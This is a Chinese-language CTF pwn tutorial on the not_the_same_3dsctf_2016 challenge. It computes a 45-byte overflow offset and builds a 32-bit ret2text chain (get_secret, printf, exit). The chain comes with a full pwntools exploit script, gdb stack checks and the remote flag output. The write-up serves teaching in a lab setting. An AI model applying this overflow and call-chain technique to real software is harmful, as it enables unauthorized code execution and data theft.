---
title: "Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾"
date: 2026-11-14 15:00:00
updated: 2026-11-14 15:00:00
categories:
  - CTF
  - Pwn
  - 栈溢出
tags:
  - Pwn
  - 栈溢出
  - ret2text
  - 32位
  - cdecl
  - gets
  - printf
  - exit
  - pwntools
  - gdb
  - pwndbg
  - 3dsctf2016
description: 这道题把 32 位 ret2text 的完整链路走了一遍：get_secret 只把 flag 读进全局变量、不打印，所以要在栈上手工搭出 get_secret → printf(flag) → exit 的假调用栈。重点讲清楚 45 字节偏移怎么从 sub esp,0x3c 和 v4 的 esp+0xf 算出来、cdecl 的参数位置、为什么必须用 exit 收尾，以及 gdb 里 telescope 看到的栈布局。
difficulty: 入门
topic: Pwn 入门
series: Pwn 入门
series_order: 5
permalink: 2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（做完 [get_started](/2026/11/10/pwn-ctf-get-started-3dsctf-2016/) 之后，正好接着练 32 位栈传参）
- **考点**：32 位 cdecl 栈传参、`gets` 栈溢出、ret2text、给利用函数“喂”参数、用 `printf` 输出、用 `exit` 冲刷缓冲区
- **工具**：`file`、`checksec`、IDA、gdb + pwndbg、`objdump`、pwntools
- **漏洞点**：`gets(v4)`，`v4` 在 `esp+0xf`
- **偏移**：`0x3c - 0xf = 0x2d = 45`（这题**没有**保存的 ebp 要跳过）
- **利用函数**：`get_secret`，地址 `0x080489a0`，只把 flag 读进全局变量 `fl4g`，不打印
- **输出函数**：`printf`，地址 `0x0804f0a0`
- **收尾函数**：`exit`，地址 `0x0804e660`
- **payload**：`45` 字节填充 + `get_secret` + `printf` + `exit` + `fl4g`，共 `61` 字节
- **flag**：`CTF2{6f7ca70d-79fa-4834-affe-59b333f1206d}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：C 语言函数调用、栈的基本概念、会用 gdb 和 pwntools（前面四篇都讲过）
- **环境**：Linux（Kali / Ubuntu），IDA、gdb + pwndbg、pwntools
- **靶场**：文中的地址是当时平台的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- 本文所有操作仅用于**授权靶场和教学**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`file 看类型` → `checksec 看保护` → `IDA 看 main 算偏移` → `看 get_secret 发现不打印` → `找 printf 和 exit` → `画栈图` → `写 exp` → `gdb 验证栈布局` → `打远程拿 flag`
{% endnote %}

## 这道题为什么值得做

前面几道 32 位题里，后门函数通常已经写好了 `system("cat flag.txt")` 或者 `printf(flag)`，我们只要把返回地址改过去就行。

这道题不一样：**它有一个读 flag 的函数，但这个函数不输出。**

```c
int get_secret()
{
  v0 = fopen("flag.txt", &unk_80CF91B);
  fgets(&fl4g, 45, v0);
  return fclose(v0);
}
```

它只是把 `flag.txt` 读进一个全局变量 `fl4g`，然后 `fclose` 返回。你直接跳过去，程序会安安静静地结束，屏幕上什么都没有。

所以这题的核心不是“找后门”，而是：

1. 找到把 flag 读进来的函数；
2. 找到能把内存打印出来的函数；
3. **在栈上手工搭一个调用，把第 1 步读到的地址作为参数传给第 2 步。**

这就是“真正的攻击不会给你一个现成做好、调用就能跑通的函数”的意思。下面按完整流程走一遍。

## 第一步：file 与 checksec

先看文件类型：

```bash
file pwn7
```

![file 查看文件类型](image.png)

*图 1：32 位、静态链接、not stripped*

```text
pwn7: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux),
statically linked, for GNU/Linux 2.6.32, not stripped
```

逐段看：

| 字段 | 含义 | 对做题的影响 |
| --- | --- | --- |
| `ELF 32-bit` | 32 位可执行文件 | 地址占 4 字节，exp 里用 `p32` |
| `LSB` | 小端序 | 低字节放低地址，`p32` 会自动处理 |
| `Intel 80386` | i386 架构 | 参数走栈，不走寄存器 |
| `statically linked` | 静态链接 | libc 被打进程序，函数地址固定，不需要泄露 libc |
| `for GNU/Linux 2.6.32` | 目标内核版本很老 | 老题的常见痕迹 |
| `not stripped` | 符号表还在 | IDA / gdb 里能直接看到函数名 |

静态链接是这道题最省事的地方：`printf`、`fopen`、`fgets`、`exit` 全都在程序自己的代码段里，地址是固定的，不用像动态链接那样先泄露 libc。

再看保护：

```bash
checksec --file=pwn7
```

![checksec 查看保护](image-1.png)

*图 2：No canary、NX enabled、No PIE*

```text
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
Stripped: No
```

| 字段 | 本例 | 一句话解释 |
| --- | --- | --- |
| `Arch` | `i386-32-little` | 32 位小端序，用 `p32` |
| `RELRO` | `Partial RELRO` | GOT 部分只读，但这题不涉及 GOT 劫持 |
| `Stack` | `No canary found` | 没有栈金丝雀，可以直接覆盖返回地址 |
| `NX` | `NX enabled` | 栈不可执行，不能放 shellcode |
| `PIE` | `No PIE (0x8048000)` | 程序基址固定，函数地址可以写死 |
| `Stripped` | `No` | 符号表还在，找函数很方便 |

这题的保护组合很典型：

- **No canary**：`gets` 可以一路写到返回地址；
- **No PIE**：`get_secret`、`printf`、`exit` 的地址都是固定的；
- **NX enabled**：不能执行栈上的 shellcode，但我们可以 **ret2text**，跳到程序自己的代码段，不需要执行新代码。

## 第二步：IDA 看 main，算偏移

把 `pwn7` 拖进 IDA，找到 `main`，按 `F5`：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[45]; // [esp+Fh] [ebp-2Dh] BYREF

  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");
  gets(v4);
  return 0;
}
```

![IDA 中的 main](image-2.png)

*图 3：`v4` 在 `esp+0xF`，`gets` 直接读进这个 45 字节的缓冲区*

代码很短，但有两个信息很关键：`v4` 在 `esp+0xF`，长度 45。

再看汇编：

![main 的汇编](image-5.png)

*图 4：`sub esp,0x3c`、`lea eax,[esp+0xf]`、`call gets`*

```asm
0x080489e0 <+0>:  sub  esp, 0x3c
0x080489e3 <+3>:  mov  DWORD PTR [esp], 0x80bc2b...
0x080489ea <+10>: call 0x804f0a0 <printf>
0x080489ef <+15>: lea  eax, [esp+0xf]
0x080489f3 <+19>: mov  DWORD PTR [esp], eax
0x080489f6 <+22>: call 0x804f8d0 <gets>
0x080489fb <+27>: xor  eax, eax
0x080489fd <+29>: add  esp, 0x3c
0x08048a00 <+32>: ret
```

### 45 是怎么算出来的

32 位 cdecl 下，`main` 被 `call` 进来时，栈顶 `[esp]` 就是**返回地址**。

函数开头执行：

```asm
sub esp, 0x3c
```

栈指针往下挪了 `0x3c` 字节。于是返回地址的位置变成：

```text
返回地址 = esp + 0x3c
```

而 `gets` 写入的缓冲区起点是：

```text
v4 = esp + 0xf
```

两者相减：

```text
0x3c - 0xf = 0x2d = 45
```

所以前 **45 个字节**是填充，第 46 个字节开始就是返回地址。

### 为什么没有保存的 ebp

注意汇编里**没有**：

```asm
push ebp
mov  ebp, esp
```

编译器用了 `-fomit-frame-pointer`，直接用 `esp` 寻址。所以这题不需要像 64 位那样再填 8 字节保存的 `rbp`，45 字节之后直接就是返回地址。

IDA 注释里的 `[ebp-2Dh]` 是它按“标准帧”推出来的初始偏移，数值也是 45；但既然函数没有 `push ebp`，**真正可靠的是 `[esp+Fh]` 和 `sub esp,0x3c` 这一对**。

### 画成栈图

```text
        高地址
        +--------------------------+
        |  main 的返回地址 (4)     |  <- esp + 0x3c
        +--------------------------+
        |  ... 栈帧里的其他空间 ... |
        +--------------------------+
        |  v4[45]                  |  <- esp + 0xf   gets 从这里开始写
        +--------------------------+
        |  ...                     |
        +--------------------------+
        低地址  <- esp
```

`gets` 从 `v4` 往高地址写，先填满 45 字节，再往下就碰到返回地址。

{% note warning %}
**不要看到 `sub esp,0x3c` 就直接写 60。** `0x3c` 是整个栈帧的大小，不是缓冲区到返回地址的距离。缓冲区在 `esp+0xf`，所以是 `0x3c - 0xf = 45`。同一道题里，缓冲区位置换一下，偏移就完全不同。
{% endnote %}

### 在 gdb 里验证

先下断点：

```text
pwndbg> b *main+22
Breakpoint 2 at 0x80489f6
```

![在 gets 处下断点](image-8.png)

*图 5：`b *main+22` 正好停在 `call gets` 之前*

`main+22` 就是 `0x80489f6`，也就是 `call gets` 那条指令。再在 `ret` 处下一个：

```text
pwndbg> b *main+32
Breakpoint 3 at 0x8048a00
```

![在 ret 处下断点](image-9.png)

*图 6：`b *main+32` 停在 `ret`，这时 payload 已经写完*

运行后输入 **45 个 A + 4 个 B**：

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

在 `ret` 处看栈：

```text
pwndbg> x/8wx $esp
```

应该能看到返回地址被 `0x42424242` 覆盖。看到这个，就说明偏移算对了。

## 第三步：get_secret 只读不打印

在 IDA 的函数列表里找到 `get_secret`：

```c
int get_secret()
{
  int v0; // esi

  v0 = fopen("flag.txt", &unk_80CF91B);
  fgets(&fl4g, 45, v0);
  return fclose(v0);
}
```

![get_secret 伪代码](image-3.png)

*图 7：`get_secret` 只 `fgets` 到 `fl4g`，没有 `printf`*

汇编也印证了这一点：

![get_secret 汇编](image-6.png)

*图 8：`fgets` 的目标地址是 `0x80eca2d`，即全局变量 `fl4g`*

```asm
0x080489a0 <+0>:  push esi
0x080489a1 <+1>:  sub  esp, 0x18
0x080489a4 <+4>:  mov  DWORD PTR [esp+0x4], 0x80cf91b
0x080489ac <+12>: mov  DWORD PTR [esp], 0x80bc2a8      ; "flag.txt"
0x080489b3 <+19>: call 0x804f710 <fopen>
0x080489b8 <+24>: mov  esi, eax
0x080489ba <+26>: mov  DWORD PTR [esp+0x8], esi
0x080489be <+30>: mov  DWORD PTR [esp+0x4], 0x2d        ; 45
0x080489c6 <+38>: mov  DWORD PTR [esp], 0x80eca2d       ; &fl4g
0x080489cd <+45>: call 0x804f4c0 <fgets>
0x080489d2 <+50>: mov  DWORD PTR [esp], esi
0x080489d5 <+53>: call 0x804f190 <fclose>
0x080489da <+58>: add  esp, 0x18
0x080489dd <+61>: pop  esi
0x080489de <+62>: ret
```

逐段看：

| 指令 | 作用 |
| --- | --- |
| `mov [esp], 0x80bc2a8` | `fopen` 的第一个参数：字符串 `"flag.txt"` |
| `mov [esp+0x4], 0x80cf91b` | `fopen` 的第二个参数：打开模式 |
| `call fopen` | 打开文件，返回值（FILE*）放到 `eax` |
| `mov esi, eax` | 把 FILE* 存到 `esi` |
| `mov [esp+0x8], esi` | `fgets` 的第三个参数：FILE* |
| `mov [esp+0x4], 0x2d` | `fgets` 的第二个参数：最多读 45 字节 |
| `mov [esp], 0x80eca2d` | `fgets` 的第一个参数：目标缓冲区 `&fl4g` |
| `call fgets` | 把 flag 读进 `0x80eca2d` |
| `call fclose` | 关闭文件 |

关键点：**`fl4g` 是全局变量，地址固定在 `0x80eca2d`。** 它不是栈上的局部变量，所以不会随着函数返回而失效，也不受 ASLR 影响（No PIE）。

`get_secret` 执行完之后：

- `flag.txt` 的内容已经在 `0x80eca2d`；
- 程序返回到调用者；
- **没有任何输出**。

所以只跳 `get_secret` 是不够的，必须再调用一个输出函数，把 `0x80eca2d` 当参数传进去。

## 第四步：找 printf 和 exit

### printf 的地址

回看 `main` 的汇编：

```asm
0x080489ea <+10>: call 0x804f0a0 <printf>
```

`printf` 的地址就是 **`0x0804f0a0`**。

因为程序是静态链接，这个地址就在程序自己的代码段里，不需要去外部 `libc.so` 里找。No PIE 又保证了它在远程也是同一个地址。

### exit 的地址

用 `objdump` 找：

```bash
objdump -d ./pwn7 | grep -i "exit"
```

![objdump 找 exit](image-7.png)

*图 9：`exit` 的入口在 `0x0804e660`*

```text
0804e660 <exit>:
```

所以 `exit` 的地址是 **`0x0804e660`**。

### 为什么需要 exit

`printf` 的输出不是立刻写到屏幕上的，而是先放进 **stdio 缓冲区**：

- 输出到终端时，通常是行缓冲，遇到换行就刷；
- 输出到管道、socket、文件时，通常是**全缓冲**，缓冲区满了或者调用 `fflush` / `exit` 才刷。

远程 pwn 的连接就是 socket，属于全缓冲。如果 `printf` 打完 flag 后，程序返回到一个垃圾地址并崩溃，**缓冲区里的内容可能还没发出去**，你在本地就什么都收不到。

`exit` 会做两件事：

1. 刷新所有 stdio 缓冲区；
2. 终止进程。

所以 payload 最后跳到 `exit`，保证 flag 被送出来。

{% note warning %}
**不要用 `_exit` 代替 `exit`。** `_exit` 是直接结束进程的系统调用，**不会刷新 stdio 缓冲区**。`exit` 是 C 库函数，会先 `fflush` 再 `_exit`。打印型后门用 `exit` 收尾，用 `_exit` 可能什么都看不到。
{% endnote %}

## 第五步：画栈图，写 payload

### 先理清 cdecl 的调用形状

32 位 Linux 用 cdecl：

1. 调用者把参数**从右往左**压栈；
2. `call` 把返回地址压栈；
3. 被调函数执行时，`[esp]` 是返回地址，`[esp+4]` 是第一个参数，`[esp+8]` 是第二个参数；
4. 函数返回后，由**调用者**清理参数（`add esp, n`）。

我们不是在写汇编，而是在栈上**手工摆一个假的调用栈**。`ret` 指令会从栈顶弹出一个地址当 `eip`，所以我们只要把“返回地址”和“参数”按顺序排好就行。

### 目标链

我们希望执行顺序是：

```text
main 返回 → get_secret() 读 flag → get_secret 返回 → printf(fl4g) → printf 返回 → exit
```

对应到栈上：

```text
        高地址
        +--------------------------+
        |  fl4g 指针 (0x80eca2d)   |  <- printf 的参数
        +--------------------------+
        |  exit (0x0804e660)       |  <- printf 的返回地址
        +--------------------------+
        |  printf (0x0804f0a0)     |  <- get_secret 的返回地址
        +--------------------------+
        |  get_secret (0x080489a0) |  <- main 的返回地址（被覆盖）
        +--------------------------+
        |  45 字节填充             |
        +--------------------------+
        低地址
```

从下往上看：

1. `main` 的 `ret` 弹出 `get_secret`，跳到 `get_secret`；
2. `get_secret` 的 `ret` 弹出 `printf`，跳到 `printf`；
3. 此时栈顶是 `exit`（`printf` 的返回地址），栈顶下一个是 `fl4g`（`printf` 的参数）；
4. `printf` 按 cdecl 读 `[esp+4]` 作为第一个参数，也就是 `fl4g`，打印 flag；
5. `printf` 返回，跳到 `exit`，刷新缓冲区并结束。

### 写 exp

```python
from pwn import *

context.log_level = 'info'
context.terminal = ["tmux", "new-window"]

HOST = '27cbd01d5fff4706e26500ec.tcp-ctf2.dasctf.com'
PORT = 9999

PADDING = 45
GET_SECRET = 0x080489a0
PRINTF = 0x0804f0a0
EXIT = 0x0804e660
FL4G = 0x80eca2d

# io = gdb.debug("./pwn7", gdbscript='''
#     b *main
#     continue
# ''')
io = remote(HOST, PORT, ssl=True, sni=HOST)

payload = b'A' * PADDING
payload += p32(GET_SECRET)   # main 的返回地址
payload += p32(PRINTF)       # get_secret 的返回地址
payload += p32(EXIT)         # printf 的返回地址
payload += p32(FL4G)         # printf 的参数

log.info(f"Sending Payload ({len(payload)}bytes)")
io.sendline(payload)
io.interactive()
```

payload 一共 `45 + 4 × 4 = 61` 字节，和运行输出里的 `61bytes` 对得上。

逐行看：

| 代码 | 作用 |
| --- | --- |
| `b'A' * 45` | 填满 `v4`，一直到返回地址 |
| `p32(GET_SECRET)` | 覆盖 `main` 的返回地址，先跳到 `get_secret` |
| `p32(PRINTF)` | `get_secret` 执行完后的返回地址 |
| `p32(EXIT)` | `printf` 执行完后的返回地址 |
| `p32(FL4G)` | `printf` 的第一个参数，指向存 flag 的全局变量 |

{% note info %}
**为什么 `printf` 的参数放在 `EXIT` 后面？** 因为 cdecl 的栈布局是“返回地址在前，参数在后”。`printf` 被 `ret` 进去时，`[esp]` 是它的返回地址 `exit`，`[esp+4]` 才是第一个参数。所以参数要排在 `EXIT` 的**高地址方向**，也就是 payload 的最后。
{% endnote %}

## 第六步：gdb 验证栈布局

写 exp 之前，最好在 gdb 里亲眼确认一遍。用 `gdb.debug` 或者手动下断点都行：

```text
pwndbg> b *main+22
pwndbg> b *main+32
pwndbg> r
```

`main+22` 停在 `call gets` 之前，`main+32` 停在 `ret`。输入完整 payload 后，在 `main+32` 看栈：

```text
pwndbg> telescope $esp
```

![gdb 查看栈布局](image-10.png)

*图 10：`telescope` 输出的栈布局，四个槽依次是 get_secret、printf、exit、fl4g*

```text
00:0000 esp 0xfffb9780 -> 0x80489a0 (get_secret) <- push esi
01:0004      0xfffb9784 -> 0x804f0a0 (printf)
02:0008      0xfffb9788 -> 0x804e660 (exit) <- sub esp, 0xc
03:000c      0xfffb978c -> 0x80eca2d (fl4g)
04:0010      0xfffb9790 <- 0x41414141 ('AAAA')
```

逐个槽解释：

| 槽 | 地址 | 值 | 含义 |
| --- | --- | --- | --- |
| `[esp]` | `0xfffb9780` | `0x80489a0` | `main` 的返回地址，指向 `get_secret` |
| `[esp+4]` | `0xfffb9784` | `0x804f0a0` | `get_secret` 的返回地址，指向 `printf` |
| `[esp+8]` | `0xfffb9788` | `0x804e660` | `printf` 的返回地址，指向 `exit` |
| `[esp+0xc]` | `0xfffb978c` | `0x80eca2d` | `printf` 的参数，指向 `fl4g` |
| `[esp+0x10]` | `0xfffb9790` | `0x41414141` | 填充的 `A`，已经到缓冲区低地址方向 |

`<- push esi` 这条注释是 pwndbg 在提示：如果现在跳到 `get_secret`，它的第一条指令是 `push esi`。也就是说，**断点还停在 `main+32` 的 `ret` 上，`ret` 还没执行**；一旦执行，`esp` 会弹到 `printf` 那个槽。

用 `bt` 也能看到当前还在 `main+32`：

```text
#0 0x8048a00 main+32
#1 0x80489a0 get_secret
```

这个布局和我们画的栈图完全一致。**偏移 45、四个槽的顺序都对上了，exp 就可以放心打远程了。**

{% note success %}
**gdb 验证的意义**：不是走形式。偏移算错、参数位置放反、少写一个返回地址，这些问题在本地一眼就能看出来；等到远程打不通再回头查，成本高得多。
{% endnote %}

## 第七步：打远程，拿 flag

把 `HOST` 换成平台给的地址，运行：

```bash
python3 pwn7.py
```

![运行 exp](image-11.png)

*图 11：payload 发送成功，flag 被 printf 打印出来*

输出：

```text
[+] Opening connection to 27cbd01d5fff4706e26500ec.tcp-ctf2.dasctf.com on port 9999: Done
[*] Sending Payload (61bytes)
[*] Switching to interactive mode
b0r4 v3r s3 7u 4h o b1ch4o m3m0... CTF2{6f7ca70d-79fa-4834-affe-59b333f1206d}
[*] Got EOF while reading in interactive
```

一行一行看：

| 输出 | 含义 |
| --- | --- |
| `Opening connection ... Done` | `remote` 连上靶机，`ssl=True` 表示走 TLS |
| `Sending Payload (61bytes)` | 45 填充 + 4 个 4 字节地址 |
| `b0r4 ...` | 程序自己的提示语 |
| `CTF2{...}` | `printf(fl4g)` 打印出来的 flag |
| `Got EOF while reading in interactive` | `exit` 结束了进程，连接关闭 |

flag：

```text
CTF2{6f7ca70d-79fa-4834-affe-59b333f1206d}
```

### 为什么最后是 EOF，不是 shell

因为这题没有 `system("/bin/sh")`。我们的链最后跳到 `exit`，它刷新缓冲区后直接结束进程，不会停在 `$` 提示符上。

`Got EOF` 是预期行为，不是 exp 写错了。flag 已经打印出来，进程正常退出，目的就达到了。

## 知识点补充

### 1. 32 位 cdecl 的调用栈

32 位 Linux 默认使用 cdecl 调用约定：

```text
调用者：
  push 参数2
  push 参数1
  call func        ; 压入返回地址
  add  esp, 8      ; 调用者清理参数

被调函数：
  [esp]     = 返回地址
  [esp+4]   = 参数1
  [esp+8]   = 参数2
```

画成图：

```text
高地址
+------------------+
| 参数2            |
+------------------+
| 参数1            |
+------------------+
| 返回地址         |  <- esp
+------------------+
低地址
```

我们的 payload 就是手工搭出来的这个形状：

```text
[45 填充][get_secret][printf][exit][fl4g]
                    ↑        ↑      ↑
              返回地址   返回地址  参数
```

### 2. ret2text、静态链接、NX、PIE

| 概念 | 本题情况 | 对利用的影响 |
| --- | --- | --- |
| **ret2text** | 程序里有 `get_secret`、`printf` | 直接返回到现有代码，不写 shellcode |
| **静态链接** | libc 函数在程序里 | 函数地址固定，不用泄露 libc |
| **NX** | 开启 | 栈不可执行，放弃 shellcode |
| **PIE** | 关闭 | 代码段基址固定，地址可以写死 |
| **Canary** | 关闭 | 可以直接覆盖返回地址 |

这四者组合起来，最自然的路线就是：**栈溢出 + 返回到现有函数 + 手工传参**。

### 3. 偏移计算：为什么是 45

通用公式：

```text
偏移 = 返回地址的位置 - 缓冲区的起始位置
```

本题：

```text
返回地址 = esp + 0x3c     （sub esp,0x3c 之后）
缓冲区   = esp + 0xf      （lea eax,[esp+0xf]）
偏移     = 0x3c - 0xf = 0x2d = 45
```

和前面几题对比：

| 题目 | 架构 | 缓冲区位置 | 返回地址位置 | 偏移 |
| --- | --- | --- | --- | --- |
| warmup_csaw_2016 | 64 位 | `rbp-0x40` | `rbp+8` | `0x40 + 8 = 72` |
| get_started_3dsctf_2016 | 32 位 | `esp+4` | `esp+0x3c` | `0x3c - 4 = 56` |
| **本题** | 32 位 | `esp+0xf` | `esp+0x3c` | `0x3c - 0xf = 45` |

同样是 `sub esp,0x3c`，缓冲区放在 `esp+4` 还是 `esp+0xf`，偏移就差了 11 字节。**偏移永远对着汇编算，不要背数字。**

### 4. printf 的缓冲区和 exit

C 标准库的 `stdout` 有三种缓冲模式：

| 模式 | 触发条件 | 什么时候刷新 |
| --- | --- | --- |
| 行缓冲 | 输出到终端 | 遇到 `\n`、缓冲区满、`fflush` |
| 全缓冲 | 输出到文件/socket/管道 | 缓冲区满、`fflush`、`exit` |
| 无缓冲 | `stderr` 或 `setbuf(stdout, NULL)` | 立即输出 |

远程 pwn 是 socket，通常全缓冲。如果程序在 `printf` 之后崩溃，缓冲区里的 flag 可能还没发出去。`exit` 会刷新缓冲区，所以打印型后门通常用它收尾。

其他收尾方式：

| 方式 | 是否刷新 | 说明 |
| --- | --- | --- |
| `exit` | ✅ | 刷新 stdio 后终止 |
| `_exit` | ❌ | 直接系统调用终止 |
| `fflush(stdout)` | ✅ | 只刷新，不终止；后面还得接返回地址 |
| `puts` | 取决于缓冲 | `puts` 自己会加换行，但不保证立即刷 |
| 正常返回 | ✅ | 程序正常结束会刷新 |

### 5. 找函数地址的几种方法

| 方法 | 命令 | 适用场景 |
| --- | --- | --- |
| IDA | 函数列表 / 反汇编 | 有 GUI，最直观 |
| `objdump` | `objdump -d ./pwn7 \| grep -i exit` | 命令行快速定位 |
| `readelf` | `readelf -s ./pwn7 \| grep exit` | 看符号表 |
| pwntools | `ELF('./pwn7').symbols['get_secret']` | 写 exp 时动态取 |
| gdb | `p get_secret` / `info address` | 调试时确认 |

本题是 `not stripped`，符号表完整，所以 `ELF` 和 `readelf` 都能直接拿到名字。如果是 stripped 的静态程序，就只能靠 IDA 或特征字符串定位。

### 6. 32 位要不要栈对齐

64 位 SysV ABI 要求 `call` 前 `rsp % 16 == 0`，不对齐会在 `movaps` 上崩。32 位 i386 的 ABI 只要求 4 字节对齐，大多数 32 位 glibc 函数不依赖 16 字节对齐，所以这题不用额外处理。

如果真遇到 32 位程序在 `printf` 里崩，可以试试在链里加一个 `ret` gadget，按 4 字节的倍数调整 `esp`。但这属于少数情况，先跑通再说。

### 7. 远程连接

平台的 `tcp-ctf2` 入口套了 TLS，所以：

```python
io = remote(HOST, PORT, ssl=True, sni=HOST)
```

- `ssl=True`：启用 TLS；
- `sni=HOST`：SNI 写主机名，证书校验/路由需要；
- 端口通常是 `9999`，以平台为准。

如果是普通 `nc` 靶场，直接 `remote(HOST, PORT)`，不要加 `ssl=True`，否则会握手失败。

### 8. 如果 get_secret 不存在怎么办

这题运气好，程序里既有读 flag 的函数，又有 `printf`。如果没有现成的读文件函数，就得自己构造更长的 ROP 链：

| 情况 | 思路 |
| --- | --- |
| 有 `system`，没有 `/bin/sh` | 往可写内存写 `/bin/sh`，再调 `system` |
| 没有 `system` | ret2libc：泄露 libc 地址，算 `system` 和 `/bin/sh` |
| 静态链接、函数齐全 | 直接拼 `open` / `read` / `write` 系统调用 |
| 有格式化字符串 | 用 `%n` 写内存，再跳转 |
| NX 关闭 | 往栈上写 shellcode，跳到栈 |

这题是“函数齐全但缺一步输出”的典型，正好用来练“给函数喂参数”。

## 新手常见问题

{% note info %}
**Q1：为什么直接跳 `get_secret` 没有输出？**

`get_secret` 只做三件事：`fopen`、`fgets` 到全局变量 `fl4g`、`fclose`。它没有调用任何输出函数，所以 flag 只是在内存里，屏幕上什么都看不到。必须再调用 `printf(fl4g)` 才能打印。
{% endnote %}

{% note info %}
**Q2：为什么偏移是 45，不是 `0x3c = 60`？**

`0x3c` 是整个栈帧的大小。`gets` 写入的缓冲区 `v4` 在 `esp+0xf`，返回地址在 `esp+0x3c`，两者相差 `0x3c - 0xf = 0x2d = 45`。缓冲区低地址方向的空间不会被 `gets` 往高地址写，所以不算进偏移。
{% endnote %}

{% note info %}
**Q3：为什么 `printf` 的参数放在 `exit` 后面？**

cdecl 下，`printf` 被 `ret` 进去时，`[esp]` 是返回地址，`[esp+4]` 才是第一个参数。payload 里 `EXIT` 是返回地址，`FL4G` 紧跟在它后面，正好落在 `[esp+4]`。
{% endnote %}

{% note info %}
**Q4：为什么必须用 `exit` 收尾？不加会怎样？**

`printf` 的输出在 stdio 缓冲区里，socket 通常是全缓冲。如果 `printf` 之后程序跳到一个垃圾地址崩溃，缓冲区可能没刷新，远程就收不到 flag。`exit` 会先刷新缓冲区再终止进程。不加 `exit` 也可能偶尔能看到，但不稳定。
{% endnote %}

{% note info %}
**Q5：`get_secret` 返回后怎么就到 `printf` 了？**

`get_secret` 的 `ret` 从栈顶弹出返回地址。我们在 `get_secret` 上面放的是 `printf`，所以它返回到 `printf`。此时栈顶是 `exit`（`printf` 的返回地址），下一个是 `fl4g`（`printf` 的参数）。
{% endnote %}

{% note info %}
**Q6：`printf` 的地址 `0x804f0a0` 是怎么来的？**

`main` 的汇编里有一句 `call 0x804f0a0 <printf>`，这就是 `printf` 的入口。程序是静态链接 + No PIE，所以这个地址在远程也是同一个。
{% endnote %}

{% note info %}
**Q7：为什么不用 `system("cat flag.txt")`？**

因为这题的程序里没有现成的 `system("cat flag.txt")` 后门。有 `get_secret` 和 `printf`，就按现有的函数拼调用链；强行找 `system` 反而要泄露 libc 或构造更长的 ROP。
{% endnote %}

{% note info %}
**Q8：gdb 里 `b *main+22` 和 `b *main+32` 是什么？**

`main+22` 是 `call gets` 那条指令的地址 `0x80489f6`，停在这里可以输入 payload；`main+32` 是 `ret` 的地址 `0x8048a00`，停在这里可以检查返回地址有没有被覆盖、栈布局对不对。
{% endnote %}

{% note info %}
**Q9：32 位需要处理栈对齐吗？**

i386 的 ABI 只要求 4 字节对齐，大多数 32 位 glibc 函数不依赖 16 字节对齐，所以这题不用。如果遇到 `printf` 内部崩溃，再考虑加 `ret` gadget 调整，但这种情况在 32 位里少见。
{% endnote %}

{% note info %}
**Q10：静态链接和动态链接有什么区别？**

静态链接把 libc 代码直接打进可执行文件，函数地址固定，不依赖外部 `.so`；动态链接在运行时加载 `libc.so.6`，函数地址受 ASLR 影响，通常要先泄露 libc 基址。本题是静态链接，所以 `printf`、`exit` 的地址可以直接写死。
{% endnote %}

{% note info %}
**Q11：flag 读进全局变量，为什么不用栈地址？**

因为 `get_secret` 里 `fgets` 的目标是 `0x80eca2d`，这是全局变量 `fl4g` 的地址，No PIE 下固定不变。用全局地址比用栈地址稳定：栈地址有 ASLR，而且 `get_secret` 返回后局部栈帧就失效了。
{% endnote %}

{% note info %}
**Q12：远程连不上怎么办？**

先确认三件事：主机名是不是 `*.tcp-ctf2.dasctf.com`、端口是不是 `9999`、`remote` 有没有写 `ssl=True, sni=HOST`。平台地址是临时的，过期失效很正常，换一个新环境再试。
{% endnote %}

## 完整流程速查

| 步骤 | 目的 | 操作 |
| --- | --- | --- |
| 1 | 看文件类型 | `file pwn7`，确认 32 位、静态链接、not stripped |
| 2 | 看保护 | `checksec --file=pwn7`，No canary、NX enabled、No PIE |
| 3 | 看 main | `sub esp,0x3c`，`v4` 在 `esp+0xf`，`gets(v4)` |
| 4 | 算偏移 | `0x3c - 0xf = 0x2d = 45`（无保存 ebp） |
| 5 | 看 get_secret | `fgets(&fl4g, 45, fp)`，不打印，`fl4g` 在 `0x80eca2d` |
| 6 | 找 printf | `main` 里 `call 0x804f0a0 <printf>` |
| 7 | 找 exit | `objdump -d ./pwn7 \| grep -i exit`，得到 `0x0804e660` |
| 8 | 画栈图 | `[45 填充][get_secret][printf][exit][fl4g]` |
| 9 | 写 exp | `padding + p32(get_secret) + p32(printf) + p32(exit) + p32(fl4g)` |
| 10 | gdb 验证 | 在 `main+32` 停住，`telescope $esp` 看四个槽 |
| 11 | 打远程 | `remote(HOST, 9999, ssl=True, sni=HOST)`，拿 flag |

## 小结

这道题把 32 位 ret2text 的完整链路走了一遍，几个知识点值得反复看：

- **后门不一定会打印**：`get_secret` 只读文件，不输出；要自己找 `printf`，把 `fl4g` 的地址喂给它；
- **32 位参数走栈**：cdecl 下 `[esp]` 是返回地址，`[esp+4]` 是第一个参数，手工搭调用栈就是按这个形状摆；
- **偏移对着汇编算**：`0x3c - 0xf = 45`，不是整个栈帧的 60，也不是上一个 32 位题的 56；
- **没有 `push ebp` 就没有保存的 ebp**：函数用 `esp` 寻址时，45 字节之后直接是返回地址；
- **函数序言会移动 `esp`**：`get_secret` 的 `push esi; sub esp,0x18` 是配平的，不影响我们摆好的返回地址链；
- **打印型后门要收尾**：`printf` 的输出在 stdio 缓冲区里，`exit` 会刷新缓冲区再退出，`_exit` 不会；
- **静态链接 + No PIE 很省事**：`printf`、`exit`、`fl4g` 的地址都能直接写死，不用泄露 libc；
- **gdb 验证不能省**：`telescope $esp` 一眼就能看出四个槽对不对。

下一题可以往这几个方向走：

| 方向 | 要解决的问题 |
| --- | --- |
| 32 位 + canary | 先泄露 canary，再覆盖返回地址 |
| 32 位 + PIE | 先泄露程序基址，再算真实地址 |
| 动态链接的 32 位 | ret2libc：泄露 libc 地址，找 `system` 和 `/bin/sh` |
